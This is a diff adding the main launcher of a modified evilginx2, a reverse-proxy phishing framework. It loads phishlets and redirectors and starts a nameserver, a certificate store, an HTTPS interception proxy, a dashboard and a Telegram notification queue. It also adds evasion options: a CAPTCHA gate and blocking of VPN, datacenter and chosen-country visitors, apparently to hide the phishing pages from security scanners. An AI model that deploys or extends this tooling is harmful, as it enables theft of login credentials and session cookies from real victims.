@@ -1,0 +1,310 @@
+package main
+
+import (
+	"flag"
+	"fmt"
+	_log "log"
+	"os"
+	"os/user"
+	"path/filepath"
+	"regexp"
+	"strings"
+	
+
+	"github.com/caddyserver/certmagic"
+	"github.com/fatih/color"
+	"github.com/kgretzky/evilginx2/core"
+	"github.com/kgretzky/evilginx2/database"
+	"github.com/kgretzky/evilginx2/log"
+	"go.uber.org/zap"
+	
+)
+
+var phishlets_dir = flag.String("p", "", "Phishlets directory path")
+var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
+var debug_log = flag.Bool("debug", false, "Enable debug output")
+var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
+var cfg_dir = flag.String("c", "", "Configuration directory path")
+var version_flag = flag.Bool("v", false, "Show version")
+var feed_enabled = flag.Bool("feed", false, "Enable live feed (requires separate evilfeed process on port 1337)")
+var turnstile = flag.String("turnstile", "", "Cloudflare Turnstile sitekey:secretkey to enable CAPTCHA challenge")
+var geoip_db = flag.String("geoip-db", "", "Path to directory containing GeoLite2-City.mmdb (download from https://dev.maxmind.com/geoip/geolite2-free-geolocation-data)")
+var block_vpn = flag.Bool("block-vpn", false, "Block visitors connecting from VPNs, proxies, or datacenters")
+var block_countries = flag.String("block-countries", "", "Comma-separated list of country ISO codes to block (e.g., RU,CN,IR,KP)")
+
+// Dashboard flags
+var dashboard_addr = flag.String("dashboard", "0.0.0.0:5000", "Dashboard listen address (set empty to disable)")
+var dashboard_user = flag.String("dashboard-user", "admin", "Dashboard username")
+var dashboard_pass = flag.String("dashboard-pass", "", "Dashboard password (empty = no auth)")
+
+func joinPath(base_path string, rel_path string) string {
+	var ret string
+	if filepath.IsAbs(rel_path) {
+		ret = rel_path
+	} else {
+		ret = filepath.Join(base_path, rel_path)
+	}
+	return ret
+}
+
+func showAd() {
+	lred := color.New(color.FgHiRed)
+	lyellow := color.New(color.FgHiYellow)
+	white := color.New(color.FgHiWhite)
+	message := fmt.Sprintf("%s: %s %s", lred.Sprint("Evilginx Mastery Course"), lyellow.Sprint("https://academy.breakdev.org/evilginx-mastery"), white.Sprint("(learn how to create phishlets)"))
+	log.Info("%s", message)
+}
+
+func main() {
+	flag.Parse()
+
+	if *version_flag == true {
+		log.Info("version: %s", core.VERSION)
+		return
+	}
+
+	exe_path, _ := os.Executable()
+	exe_dir := filepath.Dir(exe_path)
+
+	core.Banner()
+	showAd()
+
+	_log.SetOutput(log.NullLogger().Writer())
+	certmagic.Default.Logger = zap.NewNop()
+	certmagic.DefaultACME.Logger = zap.NewNop()
+
+	if *phishlets_dir == "" {
+		*phishlets_dir = joinPath(exe_dir, "./phishlets")
+		if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
+			*phishlets_dir = "/usr/share/evilginx/phishlets/"
+			if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
+				log.Fatal("you need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
+				return
+			}
+		}
+	}
+	if *redirectors_dir == "" {
+		*redirectors_dir = joinPath(exe_dir, "./redirectors")
+		if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+			*redirectors_dir = "/usr/share/evilginx/redirectors/"
+			if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+				*redirectors_dir = joinPath(exe_dir, "./redirectors")
+			}
+		}
+	}
+	if _, err := os.Stat(*phishlets_dir); os.IsNotExist(err) {
+		log.Fatal("provided phishlets directory path does not exist: %s", *phishlets_dir)
+		return
+	}
+	if _, err := os.Stat(*redirectors_dir); os.IsNotExist(err) {
+		os.MkdirAll(*redirectors_dir, os.FileMode(0700))
+	}
+
+	log.DebugEnable(*debug_log)
+	if *debug_log {
+		log.Info("debug output enabled")
+	}
+
+	phishlets_path := *phishlets_dir
+	log.Info("loading phishlets from: %s", phishlets_path)
+
+	if *cfg_dir == "" {
+		usr, err := user.Current()
+		if err != nil {
+			log.Fatal("%v", err)
+			return
+		}
+		*cfg_dir = filepath.Join(usr.HomeDir, ".evilginx")
+	}
+
+	config_path := *cfg_dir
+	log.Info("loading configuration from: %s", config_path)
+
+	err := os.MkdirAll(*cfg_dir, os.FileMode(0700))
+	if err != nil {
+		log.Fatal("%v", err)
+		return
+	}
+
+	crt_path := joinPath(*cfg_dir, "./crt")
+
+	cfg, err := core.NewConfig(*cfg_dir, "")
+	if err != nil {
+		log.Fatal("config: %v", err)
+		return
+	}
+	cfg.SetRedirectorsDir(*redirectors_dir)
+
+	db, err := database.NewDatabase(filepath.Join(*cfg_dir, "data.db"))
+	if err != nil {
+		log.Fatal("database: %v", err)
+		return
+	}
+
+	bl, err := core.NewBlacklist(filepath.Join(*cfg_dir, "blacklist.txt"))
+	if err != nil {
+		log.Error("blacklist: %s", err)
+		return
+	}
+
+	// Initialize GeoIP database for country tracking, VPN detection, and country blocking
+	var geoIP *core.GeoIPDatabase
+	geoIPDir := *geoip_db
+	if geoIPDir == "" {
+		geoIPDir = filepath.Join(*cfg_dir, "GeoIP")
+		os.MkdirAll(geoIPDir, 0700)
+	}
+	geoIP = core.NewGeoIPDatabase(geoIPDir)
+	if geoIP != nil {
+		log.Info("geoip: GeoIP initialized — country tracking active")
+		cfg.SetGeoIP(geoIP)
+		cfg.SetBlockVPN(*block_vpn)
+
+		// Parse blocked countries list
+		if *block_countries != "" {
+			parts := strings.Split(*block_countries, ",")
+			var cleaned []string
+			for _, p := range parts {
+				c := strings.ToUpper(strings.TrimSpace(p))
+				if len(c) == 2 || len(c) == 3 {
+					cleaned = append(cleaned, c)
+				}
+			}
+			if len(cleaned) > 0 {
+				cfg.SetBlockedCountries(cleaned)
+				log.Info("geoip: blocking visitors from countries: %s", strings.Join(cleaned, ", "))
+			}
+		}
+	} else {
+		log.Info("geoip: not available — download GeoLite2 databases from https://dev.maxmind.com")
+	}
+
+	files, err := os.ReadDir(phishlets_path)
+	if err != nil {
+		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
+		return
+	}
+	for _, f := range files {
+		if !f.IsDir() {
+			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
+			rpname := pr.FindStringSubmatch(f.Name())
+			if rpname == nil || len(rpname) < 2 {
+				continue
+			}
+			pname := rpname[1]
+			if pname != "" {
+				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), nil, cfg)
+				if err != nil {
+					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
+					continue
+				}
+				cfg.AddPhishlet(pname, pl)
+			}
+		}
+	}
+	cfg.LoadSubPhishlets()
+	cfg.CleanUp()
+
+	ns, _ := core.NewNameserver(cfg)
+	ns.Start()
+
+	crt_db, err := core.NewCertDb(crt_path, cfg, ns)
+	if err != nil {
+		log.Fatal("certdb: %v", err)
+		return
+	}
+
+	var hp *core.HttpProxy
+	tsPub, tsPriv := "", ""
+	if *turnstile != "" {
+		// CLI flag takes precedence; save keys to config so they persist for next run
+		parts := strings.Split(*turnstile, ":")
+		if len(parts) == 2 {
+			tsPub, tsPriv = parts[0], parts[1]
+			cfg.SetTurnstileKeys(tsPub, tsPriv)
+		}
+	} else if cfg.GetTurnstileSiteKey() != "" {
+		// No CLI flag but config has stored keys (set via 'config turnstile' command)
+		tsPub = cfg.GetTurnstileSiteKey()
+		tsPriv = cfg.GetTurnstileSecretKey()
+	}
+	if tsPub != "" {
+		hs, _ := core.NewHttpServer(tsPub, tsPriv, true)
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, true)
+		hs.Start(hp)
+	} else {
+		hp, _ = core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *feed_enabled, false)
+	}
+	hp.Start()
+
+	// Set up redirect pages directory and register it with the proxy
+	redirectsPagesDir := filepath.Join(*cfg_dir, "redirects")
+	os.MkdirAll(redirectsPagesDir, 0700)
+	cfg.SetRedirectsDir(redirectsPagesDir)
+	hp.SetRedirectsDir(redirectsPagesDir)
+	log.Info("redirect pages directory: %s", redirectsPagesDir)
+
+	// Start the Telegram notification queue
+	core.GetTelegramQueue().Start()
+	defer core.GetTelegramQueue().Stop()
+
+	// Initialize and start the web dashboard
+	dashboardEnabled := *dashboard_addr != ""
+	var dashboardCfg *core.DashboardConfig
+	if dashboardEnabled {
+		dashboardCfg = &core.DashboardConfig{
+			Enabled:     true,
+			BindAddress: *dashboard_addr,
+			Username:    *dashboard_user,
+			Password:    *dashboard_pass,
+		}
+	} else {
+		dashboardCfg = &core.DashboardConfig{
+			Enabled: false,
+		}
+	}
+
+	// Prefer saved credentials from config over CLI defaults
+	if savedUser := cfg.GetDashboardUser(); savedUser != "" {
+		dashboardCfg.Username = savedUser
+	}
+	if savedPass := cfg.GetDashboardPass(); savedPass != "" {
+		dashboardCfg.Password = savedPass
+	}
+
+	dashboardServer, err := core.NewDashboardServer(dashboardCfg, db)
+	if err != nil {
+		log.Warning("dashboard: failed to initialize: %v", err)
+	} else {
+		if err := dashboardServer.Start(); err != nil {
+			log.Warning("dashboard: failed to start: %v", err)
+		}
+		// Register dashboard as a virtual host on the main HTTPS proxy
+		hp.SetDashboardHandler(dashboardServer.Handler())
+		if sub := cfg.GetDashboardSubdomain(); sub != "" && cfg.GetBaseDomain() != "" {
+			log.Info("dashboard virtual host: https://%s.%s", sub, cfg.GetBaseDomain())
+		}
+	}
+
+	// Start the auto-export system (if configured)
+	autoExportCfg := core.GetAutoExportConfig()
+	log.Debug("autoexport: enabled=%v format=%s path=%s", autoExportCfg.Enabled, autoExportCfg.Format, autoExportCfg.Path)
+
+	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	if err != nil {
+		log.Fatal("%v", err)
+		return
+	}
+	if dashboardServer != nil {
+		t.SetDashboardServer(dashboardServer)
+	}
+
+	// When terminal exits, stop the dashboard
+	defer func() {
+		if dashboardServer != nil {
+			dashboardServer.Stop()
+		}
+	}()
+
+	t.DoWork()
+}
